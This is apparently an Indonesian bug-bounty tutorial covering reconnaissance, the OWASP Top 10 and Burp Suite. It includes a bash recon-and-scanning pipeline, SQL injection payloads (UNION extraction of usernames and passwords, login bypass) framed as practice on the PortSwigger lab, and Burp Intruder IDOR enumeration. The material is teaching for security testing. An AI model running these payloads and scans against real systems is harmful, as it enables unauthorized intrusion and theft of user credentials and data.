🔍 2.1 Recon & OSINT — Seni Melihat

Recon adalah fondasi semua serangan. Tanpa recon, kamu menembak dalam gelap.

Step-by-Step:

  1. Passive Recon — Kumpulkan informasi tanpa menyentuh target: WHOIS, DNS records, Google dorking, Shodan, Wayback Machine, GitHub search, LinkedIn.
  2. Subdomain Enumeration — subfinder, amass, assetfinder, certificate transparency (crt.sh).
  3. Live Host Probing — httpx, httprobe untuk filter subdomain yang benar-benar hidup.
  4. Directory & File Discovery — ffuf, dirsearch, gobuster dengan wordlist yang tepat (SecLists).
  5. Technology Fingerprinting — whatweb, wappalyzer, header analysis, favicon hash.
  6. JavaScript Analysis — Ekstrak endpoint tersembunyi dari file JS (sering jadi "pixel" yang terlewat).
  7. Screenshot & Monitoring — gowitness, aquatone untuk visual recon; diff monitoring untuk perubahan.

💡 Contoh Kompleks: Recon Pipeline Lengkap (Bash)

#!/bin/bash
# pixel-recon.sh — Pipeline recon ala Pixel Detective
# Usage: ./pixel-recon.sh target.com

DOMAIN="${1:?Usage: $0 }"
OUT="recon-${DOMAIN}-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUT"/{subs,live,dirs,js,screenshots,vulns}

echo "=========================================="
echo "  PIXEL DETECTIVE — Recon Pipeline"
echo "  Target: $DOMAIN"
echo "  Output: $OUT"
echo "=========================================="

# ── STEP 1: Subdomain Enumeration ──
echo -e "\n[1/6] Subdomain enumeration..."
subfinder -d "$DOMAIN" -all -silent -o "$OUT/subs/subfinder.txt" 2>/dev/null
assetfinder --subs-only "$DOMAIN" > "$OUT/subs/assetfinder.txt" 2>/dev/null
# Certificate Transparency
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" \
  | jq -r '.[].name_value' 2>/dev/null \
  | sed 's/\*\.//g' | sort -u > "$OUT/subs/crtsh.txt"

cat "$OUT"/subs/*.txt | sort -u > "$OUT/subs/all.txt"
echo "  → Total subdomain unik: $(wc -l < "$OUT/subs/all.txt")"

# ── STEP 2: Probe Live Hosts ──
echo -e "\n[2/6] Probing live hosts..."
cat "$OUT/subs/all.txt" \
  | httpx -silent -mc 200,301,302,403 \
    -o "$OUT/live/live.txt" 2>/dev/null
echo "  → Host hidup: $(wc -l < "$OUT/live/live.txt")"

# ── STEP 3: Technology Fingerprinting ──
echo -e "\n[3/6] Technology fingerprinting..."
whatweb -i "$OUT/live/live.txt" --log-brief="$OUT/live/tech.txt" 2>/dev/null
echo "  → Fingerprint tersimpan"

# ── STEP 4: Directory Busting (parallel) ──
echo -e "\n[4/6] Directory busting (ini butuh waktu)..."
while IFS= read -r url; do
  hostname=$(echo "$url" | sed 's|https\?://||; s|/.*||')
  ffuf -u "${url}/FUZZ" \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc 200,301,302,403 -t 50 -s \
    -o "$OUT/dirs/${hostname}.json" -of json 2>/dev/null
done < "$OUT/live/live.txt"
echo "  → Directory scan selesai"

# ── STEP 5: JavaScript Endpoint Extraction ──
echo -e "\n[5/6] Ekstraksi endpoint dari JavaScript..."
while IFS= read -r url; do
  # Ambil semua file .js dari halaman
  curl -s "$url" \
    | grep -oE 'src="[^"]+\.js[^"]*"' \
    | sed 's/src="//; s/"$//' \
    | while IFS= read -r js; do
        # Resolve relative URL
        [[ "$js" != http* ]] && js=$(echo "$url" | sed 's|\(https\?://[^/]*\).*|\1|')/"$js"
        curl -s "$js" \
          | grep -oE '["'\''](/api/[a-zA-Z0-9_/.-]+)["'\'']' \
          | tr -d '"'\''' | sort -u
      done
done < "$OUT/live/live.txt" | sort -u > "$OUT/js/endpoints.txt"
echo "  → Endpoint JS ditemukan: $(wc -l < "$OUT/js/endpoints.txt")"

# ── STEP 6: Vulnerability Scan ──
echo -e "\n[6/6] Vulnerability scan dengan nuclei..."
nuclei -l "$OUT/live/live.txt" \
  -severity low,medium,high,critical \
  -o "$OUT/vulns/nuclei.txt" 2>/dev/null
echo "  → Potensi vuln: $(wc -l < "$OUT/vulns/nuclei.txt" 2>/dev/null || echo 0)"

echo -e "\n=========================================="
echo "  [✓] Recon selesai!"
echo "  Hasil di: $OUT"
echo "=========================================="

Penjelasan: Pipeline ini menggabungkan 6 tool populer menjadi satu alur. Setiap step menghasilkan output terstruktur di folder terpisah — memudahkan review manual. Perhatikan jq untuk parsing JSON, dan sed untuk transformasi teks.

🕸️ 2.2 OWASP Top 10 — Peta Celah Web

OWASP Top 10 adalah daftar risiko keamanan web paling umum. Wajib hafal dan paham.

Step-by-Step:

  1. A01: Broken Access Control — IDOR, missing function-level access control, path traversal. Paling sering ditemukan di bug bounty.
  2. A02: Cryptographic Failures — Data sensitif tidak terenkripsi, weak hash, hardcoded secret.
  3. A03: Injection — SQLi, NoSQLi, OS Command Injection, LDAP Injection. Pahami perbedaan context.
  4. A04: Insecure Design — Logic flaw, race condition, business logic bypass.
  5. A05: Security Misconfiguration — Default credential, verbose error, directory listing, CORS misconfig.
  6. A06: Vulnerable Components — Library usang dengan CVE dikenal.
  7. A07: Identification & Auth Failures — Weak password policy, session fixation, JWT misconfig.
  8. A08: Software & Data Integrity Failures — Insecure deserialization, supply chain.
  9. A09: Logging & Monitoring Failures — Tidak ada deteksi serangan.
  10. A10: SSRF — Server-Side Request Forgery, sering jadi pivot ke internal network.

💡 Contoh Kompleks: Deteksi & Eksploitasi SQL Injection (Lab Legal)

# ============================================
# TARGET: PortSwigger Web Security Academy
# (lab legal — https://portswigger.net/web-security/sql-injection)
# ============================================

# ── STEP 1: Identifikasi titik injeksi ──
# Parameter yang mencurigakan: ?category=Gifts
# Uji dengan payload dasar:
GET /filter?category=Gifts' HTTP/1.1
Host: lab-id.web-security-academy.net

# Jika muncul error SQL → injection point confirmed

# ── STEP 2: Tentukan jumlah kolom (UNION-based) ──
GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1   # OK
GET /filter?category=Gifts' ORDER BY 2-- HTTP/1.1   # OK
GET /filter?category=Gifts' ORDER BY 3-- HTTP/1.1   # ERROR → 2 kolom

# ── STEP 3: Cari kolom yang menampilkan output ──
GET /filter?category=Gifts' UNION SELECT 'a','b'-- HTTP/1.1
# Jika 'a' atau 'b' muncul di response → kolom tersebut visible

# ── STEP 4: Ekstrak data dari database ──
GET /filter?category=Gifts' UNION SELECT username,password FROM users-- HTTP/1.1

# ── STEP 5: Jika hanya 1 kolom visible, konkatenasi ──
GET /filter?category=Gifts' UNION SELECT username||':'||password FROM users-- HTTP/1.1
# (PostgreSQL: ||, MySQL: CONCAT(), MSSQL: +)

# ── STEP 6: Bypass login (authentication bypass) ──
POST /login HTTP/1.1
Host: lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=anything

# Penjelasan: query jadi SELECT * FROM users WHERE username='administrator'--' AND password='...'
# Bagian setelah -- dikomentari → login sukses tanpa password

Penjelasan: Ini adalah metodologi SQLi klasik:
1. Detect — cari error/anomali
2. Column count — ORDER BY / UNION SELECT NULL
3. Data extraction — UNION SELECT
4. Exploit — bypass auth / dump data
Selalu praktik di lab legal seperti PortSwigger Academy.

🔧 2.3 Burp Suite — Senjata Utama Detektif

Burp Suite adalah proxy intercept #1 untuk web pentest. Wajib kuasai manual, bukan hanya scanner.

Step-by-Step:

  1. Setup Proxy — Konfigurasi browser → Burp proxy (127.0.0.1:8080), install CA certificate.
  2. Proxy & Intercept — Tangkap request, modifikasi, forward/drop. Pahami HTTP history.
  3. Repeater — Kirim request berulang, modifikasi manual, analisis response. Ini "meja kerja" detektif.
  4. Intruder — Brute force, fuzzing, enumeration. 4 attack type: Sniper, Battering Ram, Pitchfork, Cluster Bomb.
  5. Decoder & Comparer — Encode/decode (URL, base64, hex), bandingkan response.
  6. Scanner (Pro) — Automated scan, tapi jangan bergantung — manual testing tetap utama.
  7. Extensions — BApp Store: Autorize, JWT Editor, Turbo Intruder, Param Miner.

💡 Contoh Kompleks: IDOR Enumeration dengan Burp Intruder

# Skenario: Aplikasi punya endpoint /api/user/{id}/profile
# Kita sudah login sebagai user id=1001, coba akses id lain.

# ── STEP 1: Tangkap request di Proxy ──
GET /api/user/1001/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOi...

# ── STEP 2: Kirim ke Intruder (Ctrl+I) ──
# Posisi payload: /api/user/§1001§/profile

# ── STEP 3: Konfigurasi payload ──
# Payload type: Numbers
# From: 1000, To: 1100, Step: 1
# (Atau gunakan wordlist user id dari recon)

# ── STEP 4: Attack type: Sniper ──
# Start attack → perhatikan:
#   - Status code (200 = akses berhasil)
#   - Length response (berbeda = data user lain)
#   - Grep - Match: "email" atau "phone" di response

# ── STEP 5: Analisis hasil ──
# Request dengan status 200 + length berbeda = IDOR confirmed
# Contoh hasil:
#   id=1001 → 200, length 1523 (user kita)
#   id=1002 → 200, length 1487 (user lain — IDOR!)
#   id=1003 → 403, length 89   (properly protected)

# ── STEP 6: Dokumentasi ──
# Screenshot request/response, catat:
#   - Endpoint: GET /api/user/{id}/profile
#   - Impact: Unauthorized access ke data user lain (PII leak)
#   - Severity: High (jika PII) / Medium (jika non-sensitive)

Penjelasan: IDOR (Insecure Direct Object Reference) adalah salah satu bug paling umum di bug bounty. Kuncinya: ganti identifier dan lihat apakah akses masih diberikan. Burp Intruder mengotomatiskan enumerasi.

🎯 Target 2.3: Bisa menggunakan Burp Repeater & Intruder untuk manual testing tanpa bergantung pada scanner otomatis.
